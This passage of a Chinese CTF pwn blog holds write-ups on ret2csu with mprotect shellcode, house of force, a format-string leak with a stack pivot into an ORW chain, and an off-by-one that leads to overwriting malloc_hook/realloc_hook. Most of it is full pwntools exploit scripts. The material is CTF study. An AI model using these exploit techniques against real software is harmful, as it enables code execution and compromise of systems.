并且将最后的返回地址设置为shellcode首地址 就可以获取shell 1234567io.recvuntil(&quot;Input:&quot;)bss_addr = 0x600A88+0x50payload = cyclic(0x80+0x8)+p64(rdi_addr)+p64(0)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(0x100)+p64(read_addr)+p64(bss_addr)io.sendline(payload)shellcode = asm(shellcraft.sh())io.send(shellcode)io.interactive() 当题目没有给我们libc文件的时候 这时候我们无法通过libc文件来获取pop rsi和pop rdx指令地址来构造rop链 这时候只能通过csu来 但是csu实现函数调用是使用call指令 call指令需要有一个类似于got表的地址链才能实现 比如: bss_addr(存放着main函数的地址) 这时候call bss_addr 就相当于执行main函数 所以我们跟上面一步相比 还需要多出一个read链来读入mprotect_addr exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25692)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate_libc2.23&quot;)io.recvuntil(&quot;Input:&quot;)back_addr = 0x4005e6gadget1_addr = 0x400690gadget2_addr = 0x4006AAwrite_got = elf.got[&#x27;write&#x27;]bss_addr = 0x600A88+0x50payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(write_got)+p64(0x8)+p64(write_got)+p64(1)+p64(gadget1_addr)payload += cyclic(56)+p64(back_addr)io.sendline(payload)write_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(write_addr))libc_addr = write_addr - libc.sym[&#x27;write&#x27;]success(hex(libc_addr))mprotect_addr = libc_addr + libc.sym[&#x27;mprotect&#x27;]read_got = elf.got[&#x27;read&#x27;]io.recvuntil(&quot;Input:&quot;)payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(read_got)+p64(0x8)+p64(bss_addr)+p64(0)+p64(gadget1_addr)payload += cyclic(56)+p64(back_addr)io.sendline(payload)io.send(p64(mprotect_addr))io.recvuntil(&quot;Input:&quot;)payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(bss_addr)+p64(7)+p64(0x1000)+p64(0x600000)+p64(gadget1_addr)payload += cyclic(56)+p64(back_addr)io.sendline(payload)io.recvuntil(&quot;Input:&quot;)payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(read_got)+p64(0x100)+p64(bss_addr+0x8)+p64(0)+p64(gadget1_addr)payload += cyclic(56)+p64(bss_addr+0x8)io.sendline(payload)shellcode = asm(shellcraft.sh())io.send(shellcode)io.interactive()","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"house of force","slug":"house-of-force","date":"2023-02-03T14:13:56.000Z","updated":"2023-02-03T15:55:26.052Z","comments":true,"path":"2023/02/03/house-of-force/","link":"","permalink":"http://example.com/2023/02/03/house-of-force/","excerpt":"","text":"一种修改top chunk的地址来获取低地址处内存空间的chunk的办法 复习一下chunk的申请办法 是先判断bin中是否有符合大小的chunk 如果没有再去top chunk分配 top chunk的分配办法是在top chunk顶部分配出一个空间 随后top chunk的位置向高地址处增加 这一过程我们来看一下源码是如何实现的 12345678910111213141516171819202122victim = av-&gt;top;//获取当前top chunk的地址size = chunksize (victim);//获取当前top chunk的大小if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))//MINSIZE就是堆块的最小size，32位程序为0x10，64位程序为0x20//nb为实际要获取的chunk大小(申请的大小加上MINSIZE)//判断式是为了保证top chunk有足够大小的空间来供此次申请//之所以要加上MINSIZE是因为为了确保申请完chunk后 top chunk还能保持完整的chunk结构 &#123; remainder_size = size - nb;//remainder_size为分配chunk后的top chunk大小 remainder = chunk_at_offset (victim, nb);//remainder为分配完后的top chunk地址 av-&gt;top = remainder;//更新top chunk //下面两个set_head给分配出去的堆块以及分配后的top chunk设置新的size set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb);//无关 忽略 void *p = chunk2mem (victim);//无关 忽略 alloc_perturb (p, bytes); return p; &#125; 首先我们需要绕过 size &gt;&#x3D; nb + MINSIZE 这个判断式 使其结果为True 才能进入if分支 我们在进行house of force漏洞利用的时候 nb通常都是负数(下面会讲 这里先知道个大概就行) 而你也可以在源码中看到 nb在计算时是被当作一个无符号正数看待的 也就是说计算机遇到负数nb时会将其转化成补码(我在计组原理的文章中有提及)这会使得nb成为一个很庞大的数 所以我们需要让top chunk的size也作为一个负数 并且这个负数的补码要是所有负数中最大的(或者大于nb即可) 所以这里通过堆溢出覆盖top chunk的size为0xffffffffffffffff 也就是-1即可 接着就是if分支中设置top chunk新的地址的算式 remainder &#x3D; chunk_at_offset (victim, nb) 相当于 victim+nb&#x3D;top_chunk 原本的top chunk地址加上实际上要分配的大小等于新的top chunk地址 而nb &#x3D; request_size + MINSIZE top_chunk &#x3D; request_addr - MINSIZE 所以request_size &#x3D; request_addr - oldtopchunk_addr - 2*MINSIZE 接下来我们用一道例题加深一下理解 hitcontraining_bambooboxchecksec看一下保护机制 1234567[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ida看一下伪代码 12345678910111213141516171819202122232425262728293031323334353637383940int __cdecl main(int argc, const char **argv, const char **envp)&#123; void (**v4)(void); // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); v4 = malloc(0x10uLL); *v4 = hello_message; v4[1] = goodbye_message; (*v4)(); while ( 1 ) &#123; menu(); read(0, buf, 8uLL); switch ( atoi(buf) ) &#123; case 1: show_item(); break; case 2: add_item(); break; case 3: change_item(); break; case 4: remove_item(); break; case 5: v4[1](); exit(0); default: puts(&quot;invaild choice!!!&quot;); break; &#125; &#125;&#125; 常规的菜单题 给了输出chunk内容的机会 释放chunk的时候一同置零了指针 不存在UAF漏洞 具体来看一下main函数开头的几行代码 1234v4 = malloc(0x10uLL);*v4 = hello_message;v4[1] = goodbye_message;(*v4)(); 申请了0x10大小的chunk 依次存放了hello_message的地址和goodbye_message的地址 并且先执行了hello_message 12345int hello_message()&#123; puts(&quot;There is a box with magic&quot;); return puts(&quot;what do you want to do in the box&quot;);&#125; 而goodbye_message在我们选择退出程序后的分支执行 12345int goodbye_message()&#123; puts(&quot;See you next time&quot;); return puts(&quot;Thanks you&quot;);&#125; 并且程序还给了一个magic函数 可以直接输出flag信息 12345678910111213void __noreturn magic()&#123; int fd; // [rsp+Ch] [rbp-74h] char buf[104]; // [rsp+10h] [rbp-70h] BYREF unsigned __int64 v2; // [rsp+78h] [rbp-8h] v2 = __readfsqword(0x28u); fd = open(&quot;/home/bamboobox/flag&quot;, 0); read(fd, buf, 0x64uLL); close(fd); printf(&quot;%s&quot;, buf); exit(0);&#125; 所以思路就是覆盖v4这个chunk中的goodbye_message 使其为magic函数地址 为了重复申请到v4这个chunk 就需要我们调整top chunk的地址 使其为v4 chunk的地址 这样再次申请一个chunk就达成目的 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25692)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)def add(size,name): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Please enter the length of item name:&quot;) io.sendline(str(size)) io.recvuntil(&quot;Please enter the name of item:&quot;) io.send(name)def delete(index): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;Please enter the index of item:&quot;) io.sendline(str(index)) io.recvuntil(&quot;remove successful!!&quot;)def edit(index,size,name): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Please enter the index of item:&quot;) io.sendline(str(index)) io.recvuntil(&quot;Please enter the length of item name:&quot;) io.sendline(str(size)) io.recvuntil(&quot;Please enter the new name of the item:&quot;) io.send(name)def show(): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;1&#x27;)add(0x30,b&#x27;aaaa&#x27;)payload = cyclic(0x38)+p64(0xffffffffffffffff)edit(0,len(payload),payload)magic_addr = 0x400d49payload = cyclic(0x8)+p64(magic_addr)add(-0x70,b&#x27;aaaa&#x27;) 此时我们看一下chunk布局 可以看到top chunk已经调整到了原先v4chunk的位置 我们再次申请一个chunk 看看 1add(0x10,b&#x27;aaaaaaaa&#x27;*2) 可以看到成功覆盖 那么我们把垃圾数据换成magic函数的地址 就可以实现flag的泄露(不过你打buu远程不能用这种办法 他docker没还原环境) 完整exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25692)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)def add(size,name): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Please enter the length of item name:&quot;) io.sendline(str(size)) io.recvuntil(&quot;Please enter the name of item:&quot;) io.send(name)def delete(index): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;Please enter the index of item:&quot;) io.sendline(str(index)) io.recvuntil(&quot;remove successful!!&quot;)def edit(index,size,name): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Please enter the index of item:&quot;) io.sendline(str(index)) io.recvuntil(&quot;Please enter the length of item name:&quot;) io.sendline(str(size)) io.recvuntil(&quot;Please enter the new name of the item:&quot;) io.send(name)def show(): io.recvuntil(&quot;Your choice:&quot;) io.sendline(b&#x27;1&#x27;)add(0x30,b&#x27;aaaa&#x27;)payload = cyclic(0x38)+p64(0xffffffffffffffff)edit(0,len(payload),payload)magic_addr = 0x400d49payload = cyclic(0x8)+p64(magic_addr)add(-0x70,b&#x27;aaaa&#x27;)add(0x10,payload)io.recvuntil(&quot;Your choice:&quot;)io.sendline(b&#x27;5&#x27;)io.recv() 总结一下 house of force适用于 有堆溢出 没有对申请chunk的大小做过多限制 可以获取top chunk地址低地址处的任意写的机会","categories":[{"name":"堆","slug":"堆","permalink":"http://example.com/categories/%E5%A0%86/"}],"tags":[]},{"title":"2022西湖论剑初赛pwn-Message Board","slug":"2023西湖论剑初赛pwn-Message-Board","date":"2023-02-02T06:51:06.000Z","updated":"2023-02-03T06:31:25.371Z","comments":true,"path":"2023/02/02/2023西湖论剑初赛pwn-Message-Board/","link":"","permalink":"http://example.com/2023/02/02/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-Message-Board/","excerpt":"","text":"第一次在大型比赛中拿分 蛮开心的 记录一下 checksec看一下保护机制 12345678[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/xihu2&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: &#x27;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/&#x27; 顺便用xclibc改一下libc文件 方便我们本地动态调试(这题调试十分重要) ida分析一下伪代码 12345678910111213141516171819202122__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char *v3; // rax char buf[8]; // [rsp+0h] [rbp-C0h] BYREF char dest[8]; // [rsp+8h] [rbp-B8h] BYREF char v7[176]; // [rsp+10h] [rbp-B0h] BYREF sub_401236(a1, a2, a3); if ( !dword_4040AC ) &#123; strcpy(dest, &quot;Hello, &quot;); puts(&quot;Welcome to DASCTF message board, please leave your name:&quot;); read(0, buf, 8uLL); dword_4040AC = 1; &#125; v3 = strcat(dest, buf); printf(v3); puts(&quot;Now, please say something to DASCTF:&quot;); read(0, v7, 0xC0uLL); puts(&quot;Posted Successfully~&quot;); return 0LL;&#125; sub_401236函数清空了缓存区 顺便开了沙箱 onegadget和system(“&#x2F;bin&#x2F;sh”)用不了了 接着往下分析 对dword_4040AC进行了if判断 如果为0就进入分支 分支最后将其值设置为1 应该是为了防止修改返回地址为main函数 从而反复利用格式化字符串漏洞 拥有一次向buf写入0x8字节的机会 随后将buf的内容通过strcat函数和dest字符串拼接 赋值给了v3 随后printf(v3)存在格式化字符串漏洞 接着拥有一次栈溢出的机会 但是溢出字节数只有0x10 只够我们覆盖ret addr 由于开启了沙盒 所以这里只能用栈迁移了 往栈上写入rop链 那么需要泄露栈地址和libc基址 那就通过格式化字符串漏洞泄露栈地址 gdb动调看一下偏移 位于rsp+0x70处存放着栈上的地址 那么偏移为6+0x70&#x2F;8 &#x3D; 20 泄露出来了也还没有结束 我们需要计算一下我们接下来栈溢出的变量v7在栈上的地址 当前程序中我输入的v7值为aaaaaaaa 而我们泄露出来的栈地址为0x7fffffffdef0 二者地址差值为0xd0 所以v7_addr &#x3D; stack_addr - 0xd0 123456789101112131415from pwn import*io = process(&quot;./xihu2&quot;)#io = remote(&quot;tcp.cloud.dasctf.com&quot;,22472)elf = ELF(&quot;./xihu2&quot;)libc = ELF(&quot;./libc.so.6&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io.recvuntil(&quot;Welcome to DASCTF message board, please leave your name:&quot;)payload = b&#x27;%20$p&#x27;io.send(payload)io.recvuntil(&quot;Hello, &quot;)stack_addr = int(io.recv(14),16)success(hex(stack_addr))v7_addr = stack_addr -0xd0 接下来就是构造rop链 由于开启了沙盒禁用了execve 所以我们这里用orw的方法泄露flag 但是还需要用到pop rsi pop rdx指令 显然动态链接的情况下 二进制文件中是没有这两条指令的 所以我们还需要泄露libc基址 去libc文件中找到这两条指令 123456789101112131415io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)rdi_addr = 0x401413puts_got = elf.got[&#x27;puts&#x27;]back_addr = 0x4012e3puts_plt = 0x4010e0leave_addr = 0x4012e1bss_addr = 0x4040B0+0x50payload = p64(rdi_addr)+p64(puts_got)+p64(back_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(v7_addr-0x8)+p64(leave_addr)io.send(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - (0x7f5551189951-0x7f55510f9000)success(hex(libc_addr)) 但是这里泄露libc基址的时候 并非泄露出来的是我预想中的puts_addr 而是_IO_do_write+177的地址 不过照样能得到libc基址就行了 接下来就是简单的构造orw链 但是由于main函数一系列的入栈出栈操作 rsp指针的指向并不会跟我们泄露libc基址时一样 所以我们还需要进行一次动态调试 找到我们第二次写入rop链时的栈地址 调试exp: 虽然该exp的orw链偏移是调试后的正确结果 但是未调试时的orw链同样也可以 只是为了找到第二次写入v7的rsp指针地址 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import*io = process(&quot;./xihu2&quot;)#io = remote(&quot;tcp.cloud.dasctf.com&quot;,22472)elf = ELF(&quot;./xihu2&quot;)libc = ELF(&quot;./libc.so.6&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io.recvuntil(&quot;Welcome to DASCTF message board, please leave your name:&quot;)payload = b&#x27;%20$p&#x27;io.send(payload)io.recvuntil(&quot;Hello, &quot;)stack_addr = int(io.recv(14),16)success(hex(stack_addr))v7_addr = stack_addr -0xd0io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)rdi_addr = 0x401413puts_got = elf.got[&#x27;puts&#x27;]back_addr = 0x4012e3puts_plt = 0x4010e0leave_addr = 0x4012e1bss_addr = 0x4040B0+0x50payload = p64(rdi_addr)+p64(puts_got)+p64(back_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(v7_addr-0x8)+p64(leave_addr)io.send(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - (0x7f5551189951-0x7f55510f9000)success(hex(libc_addr))io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))rsi_addr = libc_addr + 0x2601frdx_addr = libc_addr + 0x142c92open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]payload = b&#x27;/flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(stack_addr-0x170)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(stack_addr-0x170)+p64(leave_addr)gdb.attach(io,&#x27;b *0x4013A3&#x27;)io.send(payload) 利用set $rsp &#x3D; $rsp - 0x30 来不断的抬高栈帧 我们可以找到我们写入的rop链 于是偏移就是当前程序运行泄露的stack_addr - 0x7ffc8bf40650 &#x3D; 0x170 12345payload = b&#x27;/flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(stack_addr-0x170)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(stack_addr-0x170)+p64(leave_addr) 还有一点就是注意最后栈迁移的地址是rop链的起始地址减去一个字长 而stack_addr - 0x170是&#x2F;flag字符串的地址 所以实际上rop链的起始地址是stack_addr - 0x168 所以覆盖old_rbp的地址应为stack_addr - 0x170 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import*io = process(&quot;./xihu2&quot;)#io = remote(&quot;tcp.cloud.dasctf.com&quot;,22472)elf = ELF(&quot;./xihu2&quot;)libc = ELF(&quot;./libc.so.6&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io.recvuntil(&quot;Welcome to DASCTF message board, please leave your name:&quot;)payload = b&#x27;%20$p&#x27;io.send(payload)io.recvuntil(&quot;Hello, &quot;)stack_addr = int(io.recv(14),16)success(hex(stack_addr))v7_addr = stack_addr -0xd0io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)rdi_addr = 0x401413puts_got = elf.got[&#x27;puts&#x27;]back_addr = 0x4012e3puts_plt = 0x4010e0leave_addr = 0x4012e1bss_addr = 0x4040B0+0x50payload = p64(rdi_addr)+p64(puts_got)+p64(back_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(v7_addr-0x8)+p64(leave_addr)io.send(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - (0x7f5551189951-0x7f55510f9000)success(hex(libc_addr))io.recvuntil(&quot;Now, please say something to DASCTF:&quot;)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))rsi_addr = libc_addr + 0x2601frdx_addr = libc_addr + 0x142c92open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]payload = b&#x27;/flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(stack_addr-0x170)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr)+p64(puts_plt)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)payload += p64(stack_addr-0x170)+p64(leave_addr)io.send(payload)io.recv()io.recv()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"roarctf_2019_easy_pwn","slug":"roarctf-2019-easy-pwn","date":"2023-01-29T13:31:46.000Z","updated":"2023-01-30T14:13:37.106Z","comments":true,"path":"2023/01/29/roarctf-2019-easy-pwn/","link":"","permalink":"http://example.com/2023/01/29/roarctf-2019-easy-pwn/","excerpt":"","text":"这道堆题比较简单 涉及到的知识点以往的文章都有介绍到 但是最后打malloc_hook的时候由于栈不满足onegadget的条件 所用到的realloc_hook的办法值得拿出来说一说 checksec看一下 保护机制全开 1234567[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ida看一下伪代码 main函数很常规 就基于菜单题实现的堆 1234567891011121314151617181920212223242526272829303132__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int v4; // [rsp+4h] [rbp-Ch] sub_AD0(a1, a2, a3); while ( 1 ) &#123; menu(); v4 = recv_data(v4); switch ( v4 ) &#123; case 1: create(); break; case 2: puts(&quot;Tell me the secret about you!!&quot;); edit(); break; case 3: delete(); break; case 4: show(); break; case 5: return 0LL; default: puts(&quot;Wrong try again!!&quot;); break; &#125; &#125;&#125; 重点抓edit函数和delete函数出来说 另外这题创建chunk用的是calloc函数 创建chunk的时候会清空chunk内容 使其为0 123456789101112131415161718192021222324252627__int64 sub_E82()&#123; int v1; // [rsp+Ch] [rbp-14h] int v2; // [rsp+Ch] [rbp-14h] int v3; // [rsp+10h] [rbp-10h] unsigned int v4; // [rsp+14h] [rbp-Ch] printf(&quot;index: &quot;); v2 = recv_data(v1); v3 = v2; if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 15 ) &#123; v2 = *(&amp;chunk_judge + 4 * v2); if ( v2 == 1 ) &#123; printf(&quot;size: &quot;); v2 = recv_data(1); v4 = compare(*(&amp;chunk_size + 4 * v3), v2); if ( v2 &gt; 0 ) &#123; printf(&quot;content: &quot;); v2 = recv_data2(chunk_point[2 * v3], v4); &#125; &#125; &#125; return v2;&#125; 根据输入的index来索引bss段数组 如果该index有对应的chunk(即chunk_judge判断成功) 则输入size 在edit函数输入的size和create chunk时输入的size二者作为compare函数的参数 跟进看一下用来干什么 123456789101112__int64 __fastcall sub_E26(int a1, unsigned int a2)&#123; __int64 result; // rax if ( a1 &gt; a2 ) return a2; if ( a2 - a1 == 10 ) LODWORD(result) = a1 + 1; else LODWORD(result) = a1; return result;&#125; 当edit_size-create_size&#x3D;10时 可以供我们多输入一个字节 那么利用四舍五入的机制 就可以做到溢出9个字节 delete函数: 123456789101112131415161718192021222324__int64 sub_F8E()&#123; int v0; // eax int v2; // [rsp+Ch] [rbp-14h] int v3; // [rsp+10h] [rbp-10h] __int64 v4; // [rsp+10h] [rbp-10h] printf(&quot;index: &quot;); v0 = recv_data(v3); v4 = v0; v2 = v0; if ( v0 &gt;= 0LL &amp;&amp; v0 &lt;= 15LL ) &#123; v4 = *(&amp;chunk_judge + 4 * v0); if ( v4 == 1 ) &#123; *(&amp;chunk_judge + 4 * v0) = 0; *(&amp;chunk_size + 4 * v0) = 0; free(chunk_point[2 * v0]); chunk_point[2 * v2] = 0LL; &#125; &#125; return v4;&#125; 指针置零了 不存在uaf漏洞 那么合计一下思路 可以利用覆写chunk size来合并chunk 从而获得free_chunk的指针 这样就可以泄露main_arena的真实地址 从而计算处真实地址 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,28013)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu16_64.so&quot;)def add(size): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;size: &quot;) io.sendline(str(size))def edit(index,size,content): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;content: &quot;)add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3payload = cyclic(0x10+8)+b&#x27;\\xe1&#x27;edit(0,0x18+10,payload)delete(1)add(0x68)#1show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(main_arena_addr))libc_addr = main_arena_addr - (0x7ff4f33beb78-0x7ff4f2ffa000)success(hex(libc_addr)) 这样我们获得了一个free chunk的指针 即chunk2 可以用其修改fd域 从而获得任意地址写的机会 因为libc版本是2.23 所以这里用malloc_hook_attack 12345678910111213add(0x68)#4delete(4)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]edit(2,8,p64(malloc_hook-0x23))add(0x68)#4add(0x68)#5onegadget_addr = libc_addr + 0x4526arealloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]success(hex(malloc_hook))payload = cyclic(0x13)+p64(onegadget_addr)edit(5,len(payload),payload)add(0x10)io.interactive() 按理来说这道题到这里就结束了 但是你会发现几个onegadget都不行 这是因为onegadget所要求的栈空间并不满足的问题 这时候两种办法 一种是hgame2023的一题中利用到的double free也能触发malloc_hook 详细解释和手法可以去看我对应的wp 还有一种办法是利用realloc来实现 下面详细介绍一下 realloc函数是用于重新分配之前被分配过的chunk空间 其也有realloc_hook 并且也类似于malloc_hook 如果不为0则调用 关键在于两点 一是realloc_hook和malloc_hook相邻 也意味着我们可以同时修改二者 第二点在于realloc调用的时候会进行大量的push操作 1234567891011121314151617181920212223242526.text:00000000000846C0 public realloc.text:00000000000846C0 realloc proc near ; CODE XREF: _realloc↑j.text:00000000000846C0 ; DATA XREF: LOAD:0000000000006BA0↑o ....text:00000000000846C0.text:00000000000846C0 var_60 = qword ptr -60h.text:00000000000846C0 var_58 = byte ptr -58h.text:00000000000846C0 var_48 = byte ptr -48h.text:00000000000846C0.text:00000000000846C0 ; __unwind &#123;.text:00000000000846C0 push r15 ; Alternative name is &#x27;__libc_realloc&#x27;.text:00000000000846C2 push r14.text:00000000000846C4 push r13.text:00000000000846C6 push r12.text:00000000000846C8 mov r13, rsi.text:00000000000846CB push rbp.text:00000000000846CC push rbx.text:00000000000846CD mov rbx, rdi.text:00000000000846D0 sub rsp, 38h.text:00000000000846D4 mov rax, cs:__realloc_hook_ptr.text:00000000000846DB mov rax, [rax].text:00000000000846DE test rax, rax.text:00000000000846E1 jnz loc_848E8.text:00000000000846E7 test rsi, rsi.text:00000000000846EA jnz short loc_846F5.text:00000000000846EC test rdi, rdi.text:00000000000846EF jnz loc_84960 所以可以修改我们的栈空间 使其符合条件(如果可以的话) 我们先使用gdb动调看一下 onegadget的条件没有被满足时 对应的栈空间 调试exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25622)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)def add(size): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;size: &quot;) io.sendline(str(size))def edit(index,size,content): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;content: &quot;)add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3payload = cyclic(0x10+8)+b&#x27;\\xe1&#x27;edit(0,0x18+10,payload)delete(1)add(0x68)#1show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(main_arena_addr))libc_addr = main_arena_addr - 